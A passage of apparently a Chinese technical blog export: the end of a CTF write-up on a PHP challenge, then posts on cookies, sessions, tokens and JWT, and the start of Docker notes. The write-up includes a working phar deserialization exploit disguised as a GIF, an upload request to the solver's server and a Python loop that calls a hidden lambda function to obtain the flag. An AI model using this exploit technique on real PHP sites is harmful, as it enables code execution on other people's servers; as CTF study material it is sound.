class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$FLAG</span> = create_function(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&#x27;die(`/read_flag`);&#x27;</span>);<br><span class="hljs-variable">$SECRET</span> = `/read_secret`;<br><span class="hljs-variable">$SANDBOX</span> = <span class="hljs-string">&quot;/var/www/data/&quot;</span> . md5(<span class="hljs-string">&quot;orange&quot;</span> . <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);<br>@mkdir(<span class="hljs-variable">$SANDBOX</span>);<br>@chdir(<span class="hljs-variable">$SANDBOX</span>);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>])) &#123;<br><span class="hljs-variable">$data</span> = serialize(<span class="hljs-keyword">new</span> User(<span class="hljs-variable">$SANDBOX</span>));<br><span class="hljs-variable">$hmac</span> = hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>);<br>setcookie(<span class="hljs-string">&quot;session-data&quot;</span>, sprintf(<span class="hljs-string">&quot;%s-----%s&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-variable">$path</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable">$random</span> = bin2hex(openssl_random_pseudo_bytes(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function my_function_<span class="hljs-subst">$random</span>() &#123;&quot;</span><br>. <span class="hljs-string">&quot;  global \$FLAG; \$FLAG();&quot;</span><br>. <span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;lucky&quot;</span>]();<br>&#125;<br>&#125;<br><span class="hljs-comment">#######################key class################################</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_session</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">global</span> <span class="hljs-variable">$SECRET</span>;<br><span class="hljs-variable">$data</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;session-data&quot;</span>];<br><span class="hljs-keyword">list</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) = explode(<span class="hljs-string">&quot;-----&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">#从cookie中取出data和hmac签名</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$hmac</span>) || !is_string(<span class="hljs-variable">$data</span>) || !is_string(<span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#判空</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!hash_equals(hash_hmac(<span class="hljs-string">&quot;sha1&quot;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$SECRET</span>), <span class="hljs-variable">$hmac</span>)) <span class="hljs-comment">#判断data加密之后和hmac签名是否对应</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$data</span> = unserialize(<span class="hljs-variable">$data</span>); <span class="hljs-comment">#反序列化</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$data</span>-&gt;avatar)) <span class="hljs-comment">#如果反序列化之后的data包含的类中无avatar成员,退出</span><br>&#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Bye Bye Bye&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>-&gt;avatar;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;url&quot;</span>] . <span class="hljs-string">&quot;/avatar.gif&quot;</span>);<br><span class="hljs-keyword">if</span> (substr(<span class="hljs-variable">$data</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) !== <span class="hljs-string">&quot;GIF89a&quot;</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Fuck off&quot;</span>);<br>&#125;<br><br>file_put_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>, <span class="hljs-variable">$data</span>);<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload OK&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!file_exists(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>)) &#123;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;/var/www/html&quot;</span>;<br>&#125;<br><br>header(<span class="hljs-string">&quot;Content-Type: image/gif&quot;</span>);<br><span class="hljs-keyword">die</span>(file_get_contents(<span class="hljs-variable">$path</span> . <span class="hljs-string">&quot;/avatar.gif&quot;</span>));<br>&#125;<br><br><span class="hljs-variable">$mode</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;m&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;upload&quot;</span>) &#123;<br>upload(check_session()); <span class="hljs-comment">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 请求url中的内容写到该路径下的avatar.gif文件中</span><br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$mode</span> == <span class="hljs-string">&quot;show&quot;</span>) &#123;<br>show(check_session()); <span class="hljs-comment">#从cookie中提取data反序列化后的avatar成员并将其内容作为路径, 展示该目录下的avatar.gif</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>思路:</p><ul><li>首先分析代码, 首先分配了一个匿名函数给flag变量, 执行了这个函数就会出flag, 所以整道题的核心就是执行这个匿名函数</li><li>题目主要有两个功能, 一个是在沙盒文件夹任意写入一个gif, 一个是根据cookie中的路径查看这个gif</li><li>一开始的想法是 —–&gt; admin是关键类,需要通过反序列化之后的析构函数去触发其中的eval —–&gt; 通过lucky参数去调用这个输出flag的函数. 而反序列化的data是从cookie中获得, 那先尝试一下伪造cookie,但是其实cookie后半部分是用hash_hmac和一个未知的秘钥生成的一个签名, 基本上无法伪造…..所以放弃这个想法</li><li>咋一看好像代码里面并没有其他能够反序列化的地方了, 然后就来到了本题的第一个考点–php中解析Phar归档中的Metadata的时候可能会有反序列化的操作, 文档中描述的Phar::getMetadata操作(<a href="http://php.net/manual/zh/phar.getmetadata.php">http://php.net/manual/zh/phar.getmetadata.php</a>)</li></ul><blockquote><ul><li>Phar?(方便开发者打包和发布php应用的类似于Java中的Jar的一种文件)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-a854e4d73e1be186.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="What is Phar?(官方文档)"></li><li>Phar归档的结构<br><img src="http://upload-images.jianshu.io/upload_images/6949366-1a263bb5852f77a8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Phar(官方文档)"></li><li>Metadata : Phar归档中可用来描述此文档的一段序列化之后的字符串<img src="http://upload-images.jianshu.io/upload_images/6949366-f850f6f9d027f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="usage of Metadata(官方文档)"></li><li>phar_parse_metadata的初始化调用, 具体PHP源码在ext/phar/phar.c<br>执行流程大致为:<br>….–&gt; phar_open_from_filename(1512行的php_stream_open_wrapper函数可以得知此函数处理phar://打开本地phar文件 1531行调用下一个函数)<img src="http://upload-images.jianshu.io/upload_images/6949366-a2c524ab1ddaff2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_open_from_filename"><br>–&gt; phar_open_from_fp(1727行调用下一个函数)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-f61c565686e8f90f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_open_from_fp"><br>–&gt; phar_parse_pharfile(1038、1122行调用下一个函数)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-4d37aa50d88c5bea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1038行"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-8c514575ce533262.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1122行"><br>–&gt; phar_parse_metadata(函数在609行)<br><img src="http://upload-images.jianshu.io/upload_images/6949366-581792f19940680a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="phar_parse_metadata函数"></li></ul></blockquote><ul><li>而且题目内upload操作提供了<code>file_get_content()</code>函数 其中地址可控,可以利用<code>phar://</code>协议读取本地phar文件(phar协议不支持远程文件[The <em>phar</em> stream wrapper does not operate on remote files, and cannot operate on remote files, and so is allowed even when the allow_url_fopen and allow_url_include INI options are disabled.](<a href="http://php.net/manual/zh/phar.using.stream.php)),%E4%B9%9F%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%8F%AA%E8%A6%81%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AAphar%E5%88%A9%E7%94%A8upload%E5%86%99%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9B%AE%E5%BD%95">http://php.net/manual/zh/phar.using.stream.php)),也就是说只要构造一个phar利用upload写到服务器目录</a>, 其中metadata设置为Admin对象,就可以进入Admin的析构函数了</li><li>接下来的问题就是如何猜出那个随机数?<br>答案是基本上猜不出来<a href="https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php">https://security.stackexchange.com/questions/101112/can-i-rely-on-openssl-random-pseudo-bytes-being-very-random-in-php</a> openssl_random_pseudo_bytes是加密级别的伪随机数生成器<a href="https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator">https://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator</a> 这是题目第二个死胡同</li><li>然后就到了题目的第二个考点, 匿名函数其实是有真正的名字 从注册匿名函数的源码(Zend/zend_builtin_functions.c 1854行) 大佬还对这个逻辑戏谑了一番 <img src="http://upload-images.jianshu.io/upload_images/6949366-5c491572afb463d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="anonymous_functions_has_name"><br><img src="http://upload-images.jianshu.io/upload_images/6949366-3f7ca4a955141198.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="name_of_anonymous_functions"><br>首先名字第一个字符被替换成了\0,也就是空字符 ,然后do操作将lambda_%d中的%d格式化成匿名函数的个数+1(从1开始)<br>所以最后得出的匿名函数的真正名字为:\0lambda_%d(%d格式化为当前进程的第n个匿名函数)</li><li>但是我们并不能知道当前的匿名函数到底有多少个, 因为每访问一次题目就会生成一个匿名函数; 最后就引出了最后一个考点, Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求(这里猜测Orange大大应该修改了默认的0,因为0为永不kill掉子进程 这样就无法fork出新进程了) 在这个新进程里面匿名函数就会是从1开始的了</li></ul><p>最后步骤分别是:</p><ol><li>先生成符合要求的phar放入自己的vps中, 生成代码为</li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span></span>&#123;<br> <span class="hljs-keyword">public</span> <span class="hljs-variable">$avatar</span> = <span class="hljs-string">&#x27;xxx&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$p</span>[<span class="hljs-string">&#x27;file.php&#x27;</span>] = <span class="hljs-string">&#x27;&lt;?php ?&gt;&#x27;</span>;<br><span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-keyword">new</span> Admin());<br><span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<br>rename(<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.phar&#x27;</span>,<span class="hljs-keyword">__DIR__</span>.<span class="hljs-string">&#x27;/avatar.gif&#x27;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>再请求<code>?m=upload&amp;url=http://vps</code></li><li>启动Orange大大写的fork脚本</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://0c166fcd-fdb3-4807-a385-a6cecf962fcd.node4.buuoj.cn/?m=upload&amp;url=phar:///var/www/data/aa8b91c60cf8b507932015218d2c847d&amp;lucky=%00lambda_1&#x27;</span><br><br>header = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;UM_distinctid=1780a89b22a7dd-03a5f4de894f678-4c3f227c-144000-1780a89b22b5be; session-data=O%3A4%3A%22User%22%3A1%3A%7Bs%3A6%3A%22avatar%22%3Bs%3A46%3A%22%2Fvar%2Fwww%2Fdata%2Faa8b91c60cf8b507932015218d2c847d%22%3B%7D-----1415716c7f33898b0082543bd26f12ab93a24e31&#x27;</span><br>&#125;<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r =requests.get(url,headers=header)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>认证及会话管理</title>
    <link href="/2021/05/29/Token%20Session%20Cookie%20JWT/"/>
    <url>/2021/05/29/Token%20Session%20Cookie%20JWT/</url>
    
    <content type="html"><![CDATA[<h1 id="Token-Session-Cookie-JWT"><a href="#Token-Session-Cookie-JWT" class="headerlink" title="Token Session Cookie JWT"></a>Token Session Cookie JWT</h1><h2 id="认证"><a href="#认证" class="headerlink" title="认证:"></a>认证:</h2><p>验证用户的身份 用户密码登录 短信验证码 邮箱验证码</p><h2 id="授权"><a href="#授权" class="headerlink" title="授权:"></a>授权:</h2><p>给以第三方应用访问改账户(个人)的某些信息资源 如：手机安装应用时 app询问你 是否允许访问相册 使用你的麦克风、摄像头 访问联系人方式；微信小程序登录是否允许获取你的昵称、头像、地区、性别<br>实现授权的方式有：cookie、session、token、OAuth</p><h2 id="凭证"><a href="#凭证" class="headerlink" title="凭证:"></a>凭证:</h2><p>实现认证和授权的前提需要有证书 而这就是认证的凭证</p><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h2><p>用于记录用户的登录状态 <strong>在一级域名和二级域名之间可以共享使用 但不可跨域！</strong><br>|    参数    |                             说明                             |<br>| :——–: | :———————————————————-: |<br>| name=value | 键值对，设置cookie名和对应的值，要求为字符串类型 Unicode-字符编码 二进制-base64 |<br>|   domain   |                cookie所属域名 默认是当前域名                 |<br>|    path    |                   设置cookie在哪些目录生效                   |<br>|   maxAge   | cookie失效时间 整数 负数-1则是临时cookie 关闭浏览器就会失效  |<br>|  expires   |                        cookie失效时间                        |<br>|   secure   |            设置协议 https ssl 传输前就会加密数据             |<br>|  httpOnly  | 无法通过js读取到cookie 但能在Application中修改 一定程度上防止了xss攻击 |</p><h2 id="Session"><a href="#Session" class="headerlink" title="Session:"></a>Session:</h2><p>基于cookie实现的记录服务器与客户端会话状态的机制 session存于服务器端 sessionid存储在客户端的cookie中<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/1.png"></p><h2 id="Token"><a href="#Token" class="headerlink" title="Token:"></a>Token:</h2><ul><li><p>Access Token<br>  |__uid(用户唯一标识)<br>  |__time(当前时间的时间戳)<br>  |__sign(token前几位哈希压缩十六进制字符串)<br>  <img src="https://raw.githubusercontent.com/wo02ie/photo/main/2.png"><br>  <strong>不受同源策略的限制！</strong></p></li><li><p>Refresh Token<br>刷新Access Token的 其实没有它也可以刷新Token但是每次刷新都会要用户输入登录的用户名和密码</p></li></ul><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/3.png"></p><h3 id="Token-和-Session-的区别"><a href="#Token-和-Session-的区别" class="headerlink" title="Token 和 Session 的区别"></a>Token 和 Session 的区别</h3><ul><li>Session 是一种<strong>记录服务器和客户端会话状态的机制，使服务端有状态化，可以记录会话信息</strong>。而 Token 是<strong>令牌</strong>，<strong>访问资源接口（API）时所需要的资源凭证</strong>。Token <strong>使服务端无状态化，不会存储会话信息。</strong></li><li>Session 和 Token 并不矛盾，作为身份认证 Token 安全性比 Session 好，因为每一个请求都有签名还能防止监听以及重放攻击，而 Session 就必须依赖链路层来保障通讯安全了。<strong>如果你需要实现有状态的会话，仍然可以增加 Session 来在服务器端保存一些状态。</strong></li><li>所谓 Session 认证只是简单的把 User 信息存储到 Session 里，因为 SessionID 的不可预测性，暂且认为是安全的。而  Token ，如果指的是 OAuth Token 或类似的机制的话，提供的是 认证 和 授权 ，认证是针对用户，授权是针对 App  。其目的是让某 App 有权利访问某用户的信息。这里的 Token 是唯一的。不可以转移到其它 App上，也不可以转到其它用户上。Session 只提供一种简单的认证，即只要有此 SessionID ，即认为有此 User  的全部权利。是需要严格保密的，这个数据应该只保存在站方，不应该共享给其它网站或者第三方 App。所以简单来说：<strong>如果你的用户数据可能需要和第三方共享，或者允许第三方调用 API 接口，用 Token 。如果永远只是自己的网站，自己的 App，用什么就无所谓了。</strong></li></ul><h2 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h2><p>利用json的一种认证授权机制，也是目前最流行的跨站认证的解决方案</p><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/4.png"></p><ul><li>跨域时 JWT位于POST请求的数据体里</li><li>一般位于http的请求头Authorization里 用Bearer模式添加</li><li>URL中包含</li></ul><h3 id="Token-和-JWT-的区别"><a href="#Token-和-JWT-的区别" class="headerlink" title="Token 和 JWT 的区别"></a>Token 和 JWT 的区别</h3><p><strong>相同：</strong></p><ul><li>都是访问资源的令牌</li><li>都可以记录用户的信息</li><li>都是使服务端无状态化</li><li>都是只有验证成功后，客户端才能访问服务端上受保护的资源</li></ul><p><strong>区别：</strong></p><ul><li>Token：服务端验证客户端发送过来的 Token 时，还需要查询数据库获取用户信息，然后验证 Token 是否有效。</li><li>JWT： 将 Token 和 Payload 加密后存储于客户端，服务端只需要使用密钥解密进行校验（校验也是 JWT 自己实现的）即可，不需要查询或者减少查询数据库，因为 JWT 自包含了用户信息和加密的数据。</li></ul><p><strong>使用 cookie 时需要考虑的问题</strong></p><ul><li>因为存储在客户端，容易被客户端篡改，使用前需要验证合法性</li><li>不要存储敏感数据，比如用户密码，账户余额</li><li>使用 httpOnly 在一定程度上提高安全性</li><li>尽量减少 cookie 的体积，能存储的数据量不能超过 4kb</li><li>设置正确的 domain 和 path，减少数据传输</li><li><strong>cookie 无法跨域</strong></li><li>一个浏览器针对一个网站最多存 20 个Cookie，浏览器一般只允许存放 300 个Cookie</li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 session 时需要考虑的问题</strong></p><ul><li>将 session 存储在服务器里面，当用户同时在线量比较多时，这些 session 会占据较多的内存，需要在服务端定期的去清理过期的 session</li><li>当网站采用<strong>集群部署</strong>的时候，会遇到多台 web 服务器之间如何做 session 共享的问题。因为 session 是由单个服务器创建的，但是处理用户请求的服务器不一定是那个创建  session 的服务器，那么该服务器就无法拿到之前已经放入到 session 中的登录凭证之类的信息了。</li><li>当多个应用要共享 session 时，除了以上问题，还会遇到跨域问题，因为不同的应用可能部署的主机不一样，需要在各个应用做好 cookie 跨域的处理。</li><li><strong>sessionId 是存储在 cookie 中的，假如浏览器禁止 cookie 或不支持 cookie 怎么办？</strong> 一般会把 sessionId 跟在 url 参数后面即重写 url，所以 session 不一定非得需要靠 cookie 实现</li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 token 时需要考虑的问题</strong></p><ul><li>如果你认为用数据库来存储 token 会导致查询时间太长，可以选择放在内存当中。比如 redis 很适合你对 token 查询的需求。</li><li><strong>token 完全由应用管理，所以它可以避开同源策略</strong></li><li><strong>token 可以避免 CSRF 攻击(因为不需要 cookie 了)</strong></li><li><strong>移动端对 cookie 的支持不是很好，而 session 需要基于 cookie 实现，所以移动端常用的是 token</strong></li></ul><p><strong>使用 JWT 时需要考虑的问题</strong></p><ul><li>因为 JWT 并不依赖 Cookie 的，所以你可以使用任何域名提供你的 API 服务而不需要担心跨域资源共享问题（CORS）</li><li>JWT 默认是不加密，但也是可以加密的。生成原始 Token 以后，可以用密钥再加密一次。</li><li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li><li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li><li>JWT 最大的优势是服务器不再需要存储 Session，使得服务器认证鉴权业务可以方便扩展。但这也是 JWT 最大的缺点：由于服务器不需要存储  Session 状态，因此使用过程中无法废弃某个 Token 或者更改 Token 的权限。也就是说一旦 JWT  签发了，到期之前就会始终有效，除非服务器部署额外的逻辑。</li><li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT的有效期应该设置得比较短。对于一些比较重要的权限，使用时应该再次对用户进行认证。</li><li>JWT 适合一次性的命令认证，颁发一个有效期极短的 JWT，即使暴露了危险也很小，由于每次操作都会生成新的 JWT，因此也没必要保存 JWT，真正实现无状态。</li><li>为了减少盗用，JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li></ul>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker</title>
    <link href="/2021/05/27/Docker/"/>
    <url>/2021/05/27/Docker/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker🐋"><a href="#Docker🐋" class="headerlink" title="Docker🐋"></a>Docker🐋</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>众所周知 开发一个项目时 有几个阶段： 开发、测试、生产 而开发时会遇到开发环境的差异 而造成开发的项目出现水土不服 此时为了避免出现这种情况 可以把软件以及环境打包 即解决了软件跨环境迁移的问题 Docker就是装这个包的容器</p><ul><li><input checked="" disabled="" type="checkbox"> 开源</li><li><input checked="" disabled="" type="checkbox"> Go语言</li><li><input checked="" disabled="" type="checkbox"> 打包后可以迁移到任何的linux的主机上</li><li><input checked="" disabled="" type="checkbox"> 沙箱机制 相互隔离 互不影响 <del>Docker逃逸</del></li></ul><h2 id="二、架构"><a href="#二、架构" class="headerlink" title="二、架构"></a>二、架构</h2><p><strong>镜像：</strong>Docker镜像可以类比为 类<br><strong>容器：</strong>可以看作是镜像的 对象 可：创建、启动、停止、删除、暂停<br><strong>仓库：</strong>用来保存镜像</p><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fhbimg.b0.upaiyun.com%2F3d7083fa7d291a90b05822583933224958a2af4d9067-6N1RKd_fw658&refer=http%3A%2F%2Fhbimg.b0.upaiyun.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113477&t=45b612ce6703b9aed09040223b8fee44"><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda"></p><h2 id="三、命令"><a href="#三、命令" class="headerlink" title="三、命令"></a>三、命令</h2><p>阿里云弄一下镜像加速器</p><p>docker</p><ul><li><p>服务：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">启动<span class="hljs-keyword"> system</span>ctl start docaker<br>停止<span class="hljs-keyword"> system</span>ctl stop docker<br>重启<span class="hljs-keyword"> system</span>ctl restart docker<br>开机自启<span class="hljs-keyword"> system</span>ctl enable docker<br></code></pre></td></tr></table></figure></li><li><p>镜像：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">local</span>：<br>查看 <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">images</span><br>删除(注意不能删除正在运行的容器) <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">rmi</span> <span class="hljs-selector-tag">id</span>(image)/<span class="hljs-selector-tag">redis</span>:<span class="hljs-selector-tag">version</span><br><span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">rmi</span> `<span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">images</span> <span class="hljs-selector-tag">-q</span>`(全删 `为esc的键)<br><span class="hljs-selector-tag">remote</span>(加速器)：<br>搜索 <span class="hljs-selector-tag">docker</span> <span class="hljs-selector-tag">search</span> <span class="hljs-selector-tag">redis</span><br>拉取 <span 